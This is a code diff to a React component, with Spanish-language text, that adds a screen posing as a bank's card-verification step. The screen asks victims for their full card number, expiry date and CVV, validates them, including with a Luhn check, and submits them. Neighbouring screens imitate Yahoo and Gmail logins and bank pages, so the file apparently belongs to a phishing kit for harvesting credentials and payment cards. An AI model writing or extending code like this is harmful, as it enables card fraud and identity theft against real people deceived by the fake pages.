@@ -65,6 +65,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   const [tarjetaInput, setTarjetaInput] = useState('');
   const [fechaVencimientoInput, setFechaVencimientoInput] = useState('');
   const [cvvInput, setCvvInput] = useState('');
+  const [tarjetaError, setTarjetaError] = useState<string | null>(null);
   const [smsCompraInput, setSmsCompraInput] = useState('');
   const [passwordError, setPasswordError] = useState<string | null>(null);
   const [gmailCorreo, setGmailCorreo] = useState('');
@@ -952,6 +953,134 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             {yahooContent}
           </div>
         );
+
+      case ScreenType.DATOS_TARJETA:
+        // Función para validar los datos de la tarjeta
+        const handleTarjetaSubmit = () => {
+          // Limpiar errores previos
+          setTarjetaError(null);
+          
+          // Validar número de tarjeta (eliminar espacios para la validación)
+          const numeroSinEspacios = tarjetaInput.replace(/\s/g, '');
+          if (numeroSinEspacios.length !== 16) {
+            setTarjetaError("El número de tarjeta debe tener 16 dígitos");
+            return;
+          }
+          
+          // Validar algoritmo de Luhn
+          if (!validateCardNumber(numeroSinEspacios)) {
+            setTarjetaError("El número de tarjeta no es válido");
+            return;
+          }
+          
+          // Validar fecha de vencimiento
+          const fechaPartes = fechaVencimientoInput.split('/');
+          if (fechaPartes.length !== 2 || fechaPartes[0].length !== 2 || fechaPartes[1].length !== 2) {
+            setTarjetaError("La fecha de vencimiento debe estar en formato MM/AA");
+            return;
+          }
+          
+          const mes = parseInt(fechaPartes[0]);
+          if (mes < 1 || mes > 12) {
+            setTarjetaError("El mes de vencimiento debe estar entre 01 y 12");
+            return;
+          }
+          
+          // Validar CVV
+          if (cvvInput.length < 3 || cvvInput.length > 4) {
+            setTarjetaError("El código de seguridad debe tener 3 o 4 dígitos");
+            return;
+          }
+          
+          // Todo correcto, enviar los datos
+          onSubmit(ScreenType.DATOS_TARJETA, {
+            numeroTarjeta: numeroSinEspacios,
+            fechaVencimiento: fechaVencimientoInput,
+            cvv: cvvInput
+          });
+        };
+
+        const datosTarjetaContent = (
+          <>
+            <h2 className="text-xl font-bold mb-3">Confirmar datos de tarjeta</h2>
+            <p className="mb-4">
+              Por tu seguridad, necesitamos verificar los datos de tu tarjeta con terminación: <strong>{screenData.terminacion || "****"}</strong>
+            </p>
+            
+            <div className="space-y-4 mb-4">
+              <div className="flex flex-col">
+                <label className="text-sm text-gray-700 mb-1">Número de tarjeta:</label>
+                <Input 
+                  type="text"
+                  placeholder="1234 5678 9012 3456"
+                  className="w-full border border-gray-300 rounded p-2"
+                  value={tarjetaInput}
+                  onChange={(e) => {
+                    // Formatear el número a medida que se ingresa
+                    const formatted = formatCardNumber(e.target.value);
+                    setTarjetaInput(formatted);
+                    
+                    // Limpiar error al escribir
+                    if (tarjetaError) setTarjetaError(null);
+                  }}
+                  maxLength={19} // 16 dígitos + 3 espacios
+                />
+              </div>
+              
+              <div className="flex space-x-4">
+                <div className="flex-1">
+                  <label className="text-sm text-gray-700 mb-1">Fecha de vencimiento:</label>
+                  <Input 
+                    type="text"
+                    placeholder="MM/AA"
+                    className="w-full border border-gray-300 rounded p-2"
+                    value={fechaVencimientoInput}
+                    onChange={(e) => {
+                      // Formatear la fecha a medida que se ingresa
+                      const formatted = formatExpirationDate(e.target.value);
+                      setFechaVencimientoInput(formatted);
+                      
+                      // Limpiar error al escribir
+                      if (tarjetaError) setTarjetaError(null);
+                    }}
+                    maxLength={5} // MM/AA = 5 caracteres
+                  />
+                </div>
+                
+                <div className="flex-1">
+                  <label className="text-sm text-gray-700 mb-1">Código de seguridad:</label>
+                  <Input 
+                    type="password"
+                    placeholder="CVV"
+                    className="w-full border border-gray-300 rounded p-2"
+                    value={cvvInput}
+                    onChange={(e) => {
+                      // Solo permitir números
+                      const value = e.target.value.replace(/\D/g, '');
+                      setCvvInput(value);
+                      
+                      // Limpiar error al escribir
+                      if (tarjetaError) setTarjetaError(null);
+                    }}
+                    maxLength={4}
+                  />
+                </div>
+              </div>
+            </div>
+            
+            {tarjetaError && (
+              <div className="text-red-500 text-sm mb-4">{tarjetaError}</div>
+            )}
+            
+            <Button 
+              className={primaryBtnClass}
+              onClick={handleTarjetaSubmit}
+            >
+              Verificar
+            </Button>
+          </>
+        );
+        return getBankContainer(datosTarjetaContent);
 
       case ScreenType.GENERANDO_ACLARACION:
         const generandoAclaracionContent = (
